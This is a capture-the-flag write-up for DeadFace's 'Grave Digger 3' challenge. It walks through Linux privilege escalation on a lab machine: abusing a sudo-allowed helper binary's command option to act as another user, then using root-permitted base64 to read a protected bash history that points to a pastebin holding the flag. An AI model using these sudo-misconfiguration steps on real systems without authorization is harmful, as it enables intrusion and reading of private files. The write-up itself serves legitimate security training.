---
title: Grave Digger 3
tags: [DeadFace, ctf]
color: success 
description: Writeup for Grave Digger 3 DeadFace CTF event.
---

# Writeup for Grave Digger 3

## Description

```text
There is one more flag that DEADFACE has hidden on d34th's machine. Somehow, you'll have to find a way to access d34th's files in his home directory. Submit the flag as flag{flag text}
```

Using the same creds from Grave Digger 1 and 2, we have access to ssh with `crypto_vamp` user. Basic check for escalating privilege shows we can use a binary called `reader` in `/opt` directory as user `lilith` without password.

```bash
crypto_vamp@c81ec1737490:~$ sudo -l
Matching Defaults entries for crypto_vamp on c81ec1737490:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User crypto_vamp may run the following commands on c81ec1737490:
    (lilith) NOPASSWD: /opt/reader
crypto_vamp@c81ec1737490:~$
```

Looking at the man page of the `reader` binary, we can see that we can actually use `-c` flag to execute commands. Using that, we can run commands as `lilith` user.

```bash
crypto_vamp@c81ec1737490:~$ man reader
man(8)                                                                               reader man page                                                                               man(8)

NAME
       reader - read files as lilith

SYNOPSIS
       reader [OPTIONS] [FILENAME]

DESCRIPTION
       reader is developed to help crypto_vamp and other new recruits read privileged files until their vetting process is complete.

OPTIONS
       -f, --file FILENAME
              Read the contents of FILENAME.

       -c, --command COMMAND
              Execute a command (for troubleshooting purposes ONLY).

       -h, --help
              View the help information.

       -v, --version
              View the version information.

       BUGS   No known bugs.

AUTHOR
       Lilith (bl0ody_mary@deadface.io)

1.3.1                                                                                  24 Sep 2022                                                                                 man(8)
crypto_vamp@c81ec1737490:~$
```

Checking for another basic `sudo -l` from the `c` flag, we can see that we can actually run `/usr/bin/base64` as `root` on the machine without password. There's another user called `spookyboi` whose `bash_history` doesn't seems to be empty. So using the given `base64` binary, let's read the history.

```bash
crypto_vamp@c81ec1737490:~$ sudo -u lilith /opt/reader -c "sudo -l"
1: Matching Defaults entries for lilith on c81ec1737490:
2:     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sb3: in\:/bin\:/snap/bin
4:
5: User lilith may run the following commands on c81ec1737490:
6:     (ALL) NOPASSWD: /usr/bin/base64
7:     (ALL) NOPASSWD: /usr/bin/gzip
8:     (ALL) NOPASSWD: /user/bin/gunzip
crypto_vamp@c81ec1737490:~$
```

```bash
crypto_vamp@c81ec1737490:~$ sudo -u lilith /opt/reader -c "ls -al /home/spookyboi"
1: total 48
2: drwxrwxr-x 1 spookyboi spookyboi 4096 Oct 13 22:50 .
3: drwxrwxr-x 1 root      root      4096 Oct 13 22:41 ..
4: -rw------- 1 spookyboi spookyboi  271 Oct 13 22:50 .bash_history
5: drwxrwxr-x 1 spookyboi spookyboi 4096 Oct 13 22:51 .keys
6: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Desktop
7: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Documents
8: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Downloads
9: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Music
10: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Pictures
11: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Public
12: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Templates
13: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Videos
crypto_vamp@c81ec1737490:~$ sudo -u lilith /opt/reader -c "sudo /usr/bin/base64 /home/spookyboi/.bash_history | base64 -d"
1: ls -l
2: cd ~
3: mkdir docs
4: rm -rf docs
5: wget https://pastebin.com/raw/XX2nkn3W > gravedigger3.txt
6: rm gravedigger3.txt
7: openssl genrsa -aes128 -out spookyboi-priv.pem 1024
8: openssl rsa -in spookyboi-priv.pem  -pubout > spookyboi-public.pem
9: rm spookyboi-public.pem
10: mv *.pem .keys/
crypto_vamp@c81ec1737490:~$
```

# Flag

```bash
» wget https://pastebin.com/raw/XX2nkn3W
--2022-10-17 17:42:07--  https://pastebin.com/raw/XX2nkn3W
Resolving pastebin.com (pastebin.com)... 172.67.34.170, 104.20.67.143, 104.20.68.143, ...
Connecting to pastebin.com (pastebin.com)|172.67.34.170|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: ‘XX2nkn3W’

XX2nkn3W                                            [ <=>                                                                                                  ]      17  --.-KB/s    in 0s

2022-10-17 17:42:07 (3.42 MB/s) - ‘XX2nkn3W’ saved [17]

» cat XX2nkn3W
flag{b4d_h1sTOrY}
```

##### Author: <a href="https://twitter.com/avijneyam" target="_blank">Avijneyam</a>
